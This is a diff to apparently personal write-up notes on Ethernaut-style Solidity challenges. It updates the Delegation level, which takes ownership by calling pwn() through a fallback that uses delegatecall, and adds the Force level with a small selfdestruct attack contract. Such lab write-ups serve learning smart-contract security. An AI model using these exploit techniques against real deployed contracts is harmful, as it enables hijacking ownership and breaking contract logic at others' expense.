@@ -72,9 +72,32 @@ contract TeleAttack {
 * Because uint is an non negative integer type when we transfer an amount greater than 20 our balance will have this underflow situation. 
 
 # 06. Delegation
-* As the word meaning say Delegate call uses memory of the orginal contract and can execute codes on the target contract.
+* As the word meaning say ```.delegatecall()``` uses memory of the orginal contract and can execute codes on the target contract.
 * Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. 
-* Here by creating a variable to call the ```pwn``` function in the target contract inside the console and passing it through the ```fallout``` function will make us the owner. ```var _pwned = web3.utils.keccak256("pwn()") ```
-* Here data passed into the fallout function is used for calling the target contract using ```.delegatecall()```
+* Here by creating a variable inside the console and passing it through the ```fallback``` function to call the ```pwn``` function in the target contract will make us the owner. ```var _pwned = web3.utils.keccak256("pwn()") ```
  
+# 07. Force
+* In solidity, for a contract to be able to receive ether, the fallback function must be marked payable or a recieve function must be there.
+* However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.
+* Here using an another contract with some balance we can sent that balance to the target contract by calling ```selfdestruct```.
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Force.sol";
+
+contract forceit {
+    Force force;
+
+    constructor(Force _force) payable {
+        force = Force(_force);
+    }
+
+    function attack() public payable {
+        address payable addr = payable(address(force));
+        selfdestruct(addr);
+    }
+    
+}
+```
  
